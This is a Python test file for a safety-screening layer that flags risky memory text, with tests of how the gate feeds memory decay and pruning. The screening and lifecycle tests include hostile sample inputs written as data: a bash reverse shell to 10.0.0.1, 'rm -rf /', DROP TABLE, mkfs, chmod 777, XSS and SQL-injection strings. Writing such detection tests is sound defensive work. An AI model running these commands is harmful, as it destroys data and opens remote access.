"""Tests for the safety gate layer (screening, gated fitness, damping, coupled decay)
and its integration with the memory lifecycle and the long-term memory pruner.
"""

from __future__ import annotations

import asyncio
import math
import time
from datetime import UTC, datetime, timedelta
from itertools import pairwise
from typing import Any

import pytest
from sqlalchemy import select

from app.core.memory.lifecycle import MemoryLifecycleManager, MemoryRecord
from app.core.metacognition.memory_pruner import LongTermMemoryPruner
from app.core.metacognition.safety_gate import (
    BLOCK_THRESHOLD,
    MAX_CONSECUTIVE_BOOSTS,
    SafetyVerdict,
    coupled_decay,
    damped_boost,
    gated_fitness,
    screen,
)
from app.storage import async_session


def _run(coro: Any) -> Any:
    return asyncio.run(coro)


# ---------------------------------------------------------------------------
# screen
# ---------------------------------------------------------------------------


def test_screen_clean_text_passes() -> None:
    verdict = screen("Summarize the deployment runbook for the staging cluster.")
    assert verdict.allowed is True
    assert verdict.penalty == 0.0
    assert verdict.reasons == ()


def test_screen_empty_text_passes() -> None:
    verdict = screen("")
    assert verdict.allowed is True
    assert verdict.penalty == 0.0
    assert verdict.reasons == ()


@pytest.mark.parametrize(
    ("text", "label"),
    [
        ("run rm -rf / to reclaim disk space", "destructive_filesystem"),
        ("DROP TABLE users;", "destructive_sql"),
        ("api_key = sk-abcdefghijklmnopqrst", "credential_assignment"),
        ("-----BEGIN RSA PRIVATE KEY-----", "private_key_block"),
        ("bash -i >& /dev/tcp/10.0.0.1/4444", "reverse_shell"),
        ("chmod -R 777 /etc", "privilege_escalation"),
        ("mkfs.ext4 /dev/sda1 && format c:", "disk_format_command"),
    ],
)
def test_screen_blocks_high_risk_single_hits(text: str, label: str) -> None:
    verdict = screen(text)
    assert verdict.allowed is False
    assert verdict.penalty >= BLOCK_THRESHOLD
    assert label in verdict.reasons


def test_screen_accumulates_multiple_patterns() -> None:
    verdict = screen("<script>alert('x')</script> UNION SELECT * FROM users")
    assert verdict.allowed is False
    assert set(verdict.reasons) == {"xss_payload", "injection_payload"}
    assert verdict.penalty == pytest.approx(min(1.0, 0.45 + 0.45))


def test_screen_single_mild_pattern_stays_allowed() -> None:
    verdict = screen("the lab stored an <script> sample in a comment field")
    assert verdict.allowed is True
    assert 0.0 < verdict.penalty < BLOCK_THRESHOLD
    assert verdict.reasons == ("xss_payload",)


def test_screen_penalty_caps_at_one() -> None:
    text = (
        "DROP TABLE users; rm -rf /; mkfs.ext4 /dev/sda1; "
        "api_key = AKIAIOSFODNN7EXAMPLE; chmod 777 /"
    )
    verdict = screen(text)
    assert verdict.penalty == 1.0
    assert verdict.allowed is False
    assert len(verdict.reasons) >= 4


def test_screen_is_deterministic() -> None:
    text = "rm -rf /tmp/cache and DROP TABLE logs"
    assert screen(text) == screen(text)


def test_safety_verdict_rejects_out_of_range_penalty() -> None:
    with pytest.raises(ValueError, match="penalty must be within"):
        SafetyVerdict(allowed=True, penalty=1.5, reasons=())


# ---------------------------------------------------------------------------
# gated_fitness
# ---------------------------------------------------------------------------


def test_gated_fitness_scales_allowed_composite() -> None:
    verdict = SafetyVerdict(allowed=True, penalty=0.2, reasons=())
    assert gated_fitness(0.8, verdict) == pytest.approx(0.64)


def test_gated_fitness_zero_penalty_is_identity() -> None:
    verdict = screen("nothing risky in this quarterly summary")
    assert verdict.penalty == 0.0
    assert gated_fitness(0.7, verdict) == pytest.approx(0.7)


def test_gated_fitness_blocks_dangerous_content() -> None:
    verdict = screen("rm -rf / && DROP TABLE users")
    assert verdict.allowed is False
    assert gated_fitness(10.0, verdict) == 0.0


def test_gated_fitness_fails_closed_at_block_threshold() -> None:
    verdict = SafetyVerdict(allowed=True, penalty=BLOCK_THRESHOLD, reasons=())
    assert gated_fitness(1.0, verdict) == 0.0


def test_gated_fitness_rejects_non_finite_composite() -> None:
    with pytest.raises(ValueError, match="finite"):
        gated_fitness(math.nan, SafetyVerdict(allowed=True, penalty=0.0))


# ---------------------------------------------------------------------------
# damped_boost
# ---------------------------------------------------------------------------


def test_damped_boost_first_step_uses_damping() -> None:
    assert damped_boost(0.5, 0.9, boost_count=1) == pytest.approx(0.5 + 0.4 * 0.6)


def test_damped_boost_increments_shrink_each_step() -> None:
    current = 0.1
    increments = []
    for count in range(1, MAX_CONSECUTIVE_BOOSTS + 1):
        new = damped_boost(current, 1.0, boost_count=count)
        increments.append(new - current)
        current = new
    assert all(later < earlier for earlier, later in pairwise(increments))
    assert increments[-1] < increments[0] * 0.1


def test_damped_boost_caps_after_max_consecutive() -> None:
    current = 0.5
    fifth = damped_boost(current, 1.0, boost_count=MAX_CONSECUTIVE_BOOSTS)
    assert fifth > current
    assert damped_boost(fifth, 1.0, boost_count=MAX_CONSECUTIVE_BOOSTS + 1) == fifth
    assert damped_boost(current, 1.0, boost_count=MAX_CONSECUTIVE_BOOSTS + 7) == current


def test_damped_boost_ignores_non_positive_delta() -> None:
    assert damped_boost(0.7, 0.2, boost_count=1) == 0.7
    assert damped_boost(0.7, 0.7, boost_count=3) == 0.7


def test_damped_boost_validates_arguments() -> None:
    with pytest.raises(ValueError, match="boost_count must be at least 1"):
        damped_boost(0.5, 0.9, boost_count=0)
    with pytest.raises(ValueError, match="damping must be within"):
        damped_boost(0.5, 0.9, boost_count=1, damping=1.5)
    with pytest.raises(ValueError, match="damping must be within"):
        damped_boost(0.5, 0.9, boost_count=1, damping=-0.1)


def test_damped_boost_rejects_non_finite_values() -> None:
    with pytest.raises(ValueError, match="finite"):
        damped_boost(math.nan, 0.9, boost_count=1)


# ---------------------------------------------------------------------------
# coupled_decay
# ---------------------------------------------------------------------------


def test_coupled_decay_frequency_slows_decay() -> None:
    low = coupled_decay(age_days=30.0, write_frequency=0.0, importance=1.0)
    high = coupled_decay(age_days=30.0, write_frequency=5.0, importance=1.0)
    assert 0.0 < low < high <= 1.0


def test_coupled_decay_monotonic_in_frequency() -> None:
    scores = [
        coupled_decay(age_days=20.0, write_frequency=float(freq), importance=0.8)
        for freq in (0, 1, 2, 4, 8, 16)
    ]
    assert all(later > earlier for earlier, later in pairwise(scores))


def test_coupled_decay_zero_age_returns_importance() -> None:
    assert coupled_decay(0.0, 0.0, 0.42) == pytest.approx(0.42)


def test_coupled_decay_zero_frequency_matches_base_curve() -> None:
    assert coupled_decay(30.0, 0.0, 1.0) == pytest.approx(0.5)
    assert coupled_decay(60.0, 0.0, 1.0) == pytest.approx(0.25)


def test_coupled_decay_clamps_inputs() -> None:
    assert coupled_decay(-5.0, 3.0, 0.9) == pytest.approx(0.9)
    assert coupled_decay(10.0, -2.0, 1.0) == coupled_decay(10.0, 0.0, 1.0)
    assert coupled_decay(10.0, 1.0, 1.5) == pytest.approx(0.5 ** (10.0 / 45.0))
    assert coupled_decay(1000.0, 0.0, 1.0) == 0.0


def test_coupled_decay_rejects_bad_half_life() -> None:
    with pytest.raises(ValueError, match="half_life_days must be positive"):
        coupled_decay(1.0, 1.0, 1.0, half_life_days=0.0)


def test_coupled_decay_rejects_non_finite_values() -> None:
    with pytest.raises(ValueError, match="finite"):
        coupled_decay(math.inf, 1.0, 1.0)


# ---------------------------------------------------------------------------
# lifecycle integration
# ---------------------------------------------------------------------------


async def _age_memory(memory_id: str, days: int, hours: int, importance: float) -> None:
    async with async_session() as db:
        record = await db.get(MemoryRecord, memory_id)
        if record is None:
            raise AssertionError(f"memory {memory_id} not found")
        record.last_accessed_at = datetime.now(UTC) - timedelta(days=days, hours=hours)
        record.importance = importance
        await db.commit()


async def _fetch_importances(user_id: str) -> dict[str, float]:
    async with async_session() as db:
        result = await db.execute(select(MemoryRecord).where(MemoryRecord.user_id == user_id))
        return {record.id: record.importance for record in result.scalars().all()}


def test_decay_with_gate_skips_gated_entries() -> None:
    manager = MemoryLifecycleManager()
    safe = _run(
        manager.write_memory(
            "quarterly review notes and follow-up actions",
            "u-gate",
            "a-gate",
            importance=1.0,
        )
    )
    risky = _run(
        manager.write_memory(
            "emergency cleanup: rm -rf / && DROP TABLE production",
            "u-gate",
            "a-gate",
            importance=1.0,
        )
    )
    _run(_age_memory(safe.memory_id, 5, 1, 1.0))
    _run(_age_memory(risky.memory_id, 5, 1, 1.0))

    report = _run(manager.decay_with_gate("u-gate", "a-gate"))

    assert report.total_memories == 2
    assert report.gated_count == 1
    assert report.pending_forget_ids == [risky.memory_id]
    assert report.pending_forget_reasons[risky.memory_id]
    assert report.decayed_count == 1

    importances = _run(_fetch_importances("u-gate"))
    assert importances[safe.memory_id] == pytest.approx(round(0.95**5, 6))
    assert importances[risky.memory_id] == 1.0


def test_decay_with_gate_accepts_custom_gate() -> None:
    manager = MemoryLifecycleManager()
    entry = _run(manager.write_memory("benign note", "u-gate2", importance=1.0))

    def block_all(text: str) -> SafetyVerdict:
        return SafetyVerdict(allowed=False, penalty=1.0, reasons=("policy",))

    report = _run(manager.decay_with_gate("u-gate2", safety_gate=block_all))

    assert report.total_memories == 1
    assert report.gated_count == 1
    assert report.decayed_count == 0
    assert report.pending_forget_ids == [entry.memory_id]
    assert report.pending_forget_reasons[entry.memory_id] == ("policy",)


def test_decay_with_gate_empty_scope() -> None:
    manager = MemoryLifecycleManager()
    report = _run(manager.decay_with_gate("u-gate-empty"))
    assert report.total_memories == 0
    assert report.decayed_count == 0
    assert report.gated_count == 0
    assert report.pending_forget_ids == []
    assert report.pending_forget_reasons == {}


# ---------------------------------------------------------------------------
# pruner integration
# ---------------------------------------------------------------------------


def _old_entry(
    pruner: LongTermMemoryPruner,
    memory_id: str,
    content: str,
    importance: float,
    access_count: int = 0,
    age_days: float = 40.0,
) -> None:
    entry = pruner.add_memory(memory_id, content, importance=importance)
    entry.created_at = time.time() - age_days * 86400
    entry.last_accessed = entry.created_at
    entry.access_count = access_count


def test_pruner_removes_low_survival_candidates(tmp_path: Any) -> None:
    pruner = LongTermMemoryPruner(storage_path=str(tmp_path / "ltm.json"), max_entries=4)
    for i, importance in enumerate((0.05, 0.1, 0.5, 0.9, 0.95)):
        _old_entry(pruner, f"m{i}", f"memory {i}", importance)

    result = pruner.prune(force=True)

    assert result.removed_ids == ["m0", "m1"]
    assert len(pruner._memories) == 3


def test_pruner_coupling_protects_high_survival_candidate(tmp_path: Any) -> None:
    pruner = LongTermMemoryPruner(storage_path=str(tmp_path / "ltm.json"), max_entries=4)
    _old_entry(pruner, "m0", "memory zero", importance=0.05)
    _old_entry(pruner, "m1", "memory one", importance=0.5)
    _old_entry(pruner, "m2", "memory two", importance=0.6)
    _old_entry(pruner, "m3", "memory three", importance=0.7)
    _old_entry(pruner, "m4", "memory four", importance=0.9)

    result = pruner.prune(force=True)

    assert result.removed_ids == ["m0"]
    assert "m1" in pruner._memories


def test_pruner_survival_threshold_parameter(tmp_path: Any) -> None:
    pruner = LongTermMemoryPruner(storage_path=str(tmp_path / "ltm.json"), max_entries=4)
    _old_entry(pruner, "m0", "memory zero", importance=0.05)
    _old_entry(pruner, "m1", "memory one", importance=0.5)
    _old_entry(pruner, "m2", "memory two", importance=0.6)
    _old_entry(pruner, "m3", "memory three", importance=0.7)
    _old_entry(pruner, "m4", "memory four", importance=0.9)

    result = pruner.prune(force=True, survival_threshold=0.25)

    assert result.removed_ids == ["m0", "m1"]


def test_pruner_coupled_survival_scales_with_access(tmp_path: Any) -> None:
    pruner = LongTermMemoryPruner(storage_path=str(tmp_path / "ltm.json"))
    _old_entry(pruner, "stale", "rarely touched note", importance=0.3, access_count=0)
    _old_entry(pruner, "hot", "hot write path", importance=0.3, access_count=45)
    stale = pruner._memories["stale"]
    hot = pruner._memories["hot"]

    cold_score = pruner.coupled_survival(stale)
    hot_score = pruner.coupled_survival(hot)

    assert 0.0 < cold_score < hot_score <= 1.0


def test_pruner_under_capacity_leaves_memories_alone(tmp_path: Any) -> None:
    pruner = LongTermMemoryPruner(storage_path=str(tmp_path / "ltm.json"), max_entries=10)
    _old_entry(pruner, "m0", "memory zero", importance=0.05)
    _old_entry(pruner, "m1", "memory one", importance=0.9)

    result = pruner.prune()

    assert result.removed_ids == []
    assert result.pruned_count == 2


def test_pruner_merge_similar_still_works(tmp_path: Any) -> None:
    pruner = LongTermMemoryPruner(storage_path=str(tmp_path / "ltm.json"), max_entries=10)
    pruner.add_memory("a", "alpha beta gamma delta", importance=0.8)
    pruner.add_memory("b", "alpha beta gamma delta epsilon", importance=0.8)

    result = pruner.prune()

    assert result.merged_count == 1
    assert result.removed_ids == ["b"]
